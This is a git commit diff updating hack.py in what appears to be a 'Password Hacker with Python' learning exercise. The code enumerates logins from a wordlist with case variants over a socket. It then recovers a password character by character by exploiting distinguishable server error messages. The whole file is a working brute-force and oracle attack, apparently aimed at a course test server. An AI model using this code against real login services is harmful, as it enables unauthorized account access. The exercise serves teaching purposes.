bbd46127b4ca1b072756e018b81bea74f1b69122
Jakub Kosowicz <kuba.kosowicz11@gmail.com>
2026-08-09 20:58:12 +0200

    Update hack.py

--- Password Hacker with Python/task/hacking/hack.py
+++ Password Hacker with Python/task/hacking/hack.py
@@ -1,6 +1,7 @@
 import socket
 import sys
-import itertools
+from itertools import product
+import json
 import string
 
 def main():
@@ -11,23 +12,50 @@ def main():
     host = sys.argv[1]
     port = int(sys.argv[2])
 
-    find_password(host, port)
-
-def find_password(host, port):
-    all_characters = string.ascii_lowercase + string.digits
     client_socket = socket.socket()
     client_socket.connect((host, port))
 
-    for length in itertools.count(1):
-        for p in itertools.product(all_characters, repeat=length):
+    login = find_login(client_socket)
+    find_password(client_socket, login)
+
+def find_login(client_socket):
+    with open('login') as f:
+        logins = f.read().splitlines()
+
+    for word in logins:
+        char_pairs = [(c.lower(), c.upper()) if c.isalpha() else (c,) for c in word]
+        for p in product(*char_pairs):
             guess = "".join(p)
-            client_socket.send(guess.encode())
+            is_valid_login = json.dumps({"login": guess, "password": 'a'})
+            client_socket.send(is_valid_login.encode())
             response = client_socket.recv(1024)
             response = response.decode()
-            if response == "Connection success!":
-                print(guess)
+            response = json.loads(response)
+            if response['result'] != "Wrong login!":
+                return guess
+
+    return None
+
+def find_password(client_socket, login):
+    all_chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
+    password = ""
+
+    while True:
+        for c in all_chars:
+            json_dict = json.dumps({"login": login, "password": password + c})
+            client_socket.send(json_dict.encode())
+            response = client_socket.recv(1024)
+            response = response.decode()
+            response = json.loads(response)
+            if response['result'] == "Exception happened during login":
+                password += c
+                break
+            elif response['result'] == "Connection success!":
+                password += c
+                print(json_dict)
                 client_socket.close()
                 return
+
 
 if __name__ == "__main__":
     main()
